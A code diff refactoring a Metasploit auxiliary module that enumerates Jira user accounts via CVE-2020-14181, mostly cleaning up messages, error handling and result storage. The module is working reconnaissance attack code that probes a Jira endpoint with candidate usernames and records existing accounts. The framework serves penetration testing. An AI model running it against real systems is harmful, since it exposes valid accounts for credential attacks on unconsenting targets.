@@ -31,7 +31,7 @@ class MetasploitModule < Msf::Auxiliary
         'References' =>
           [
             ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],
-            ['CVE', '2020-14181'],
+            ['CVE', '2020-14181']
           ],
         'DisclosureDate' => '2020-08-16'
       )
@@ -49,17 +49,22 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def do_user_enum(user)
-    print_status("Begin enumerating user at #{vhost}#{base_uri}")
-    print_status("checking user #{user}")
-    res = send_request_cgi!(
-      'uri' => "#{base_uri}",
-      'vars_get' => { 'username' => user },
+    print_status("Checking user '#{user}'")
+    res = send_request_cgi(
       'method' => 'GET',
+      'uri' => base_uri,
+      'vars_get' => { 'username' => user },
       'headers' => { 'Connection' => 'Close' }
     )
+
+    unless res
+      print_error('No Response From Server')
+      return :abort
+    end
+
     if res.body.include?('User does not exist')
-      print_bad("'User #{user} does not exist'")
-    elsif res.body.include?('<a id="avatar-full-name-link"') # this works for 8.4.1 not sure about other verions
+      print_bad("User '#{user}' does not exist")
+    elsif res.body.include?('<a id="avatar-full-name-link"') # this works for 8.4.1 not sure about other versions
       connection_details = {
         module_fullname: fullname,
         username: user,
@@ -67,28 +72,25 @@ class MetasploitModule < Msf::Auxiliary
         status: Metasploit::Model::Login::Status::UNTRIED
       }.merge(service_details)
       create_credential_and_login(connection_details)
-      print_good("'User exists: #{user}'")
-      @users_found[user] = :reported
-    else
-      print_error('No Response From Server')
-      return :abort
-    end
 
+      print_good("User exists: '#{user}'")
+      @users_found << user
+    end
   end
 
   def run_host(_ip)
+    @users_found = []
 
-    @users_found = {}
-
+    print_status("Begin enumerating users at #{vhost}#{base_uri}")
     each_user_pass do |user, _pass|
+      next if user.empty?
       do_user_enum(user)
     end
+
     if @users_found.empty?
       print_status("#{full_uri} - No users found.")
     else
-      print_good("#{@users_found.length} Users found: #{@users_found.keys.sort.join(', ')}")
-
+      print_good("#{@users_found.length} Users found: #{@users_found.sort.join(', ')}")
     end
-
   end
 end
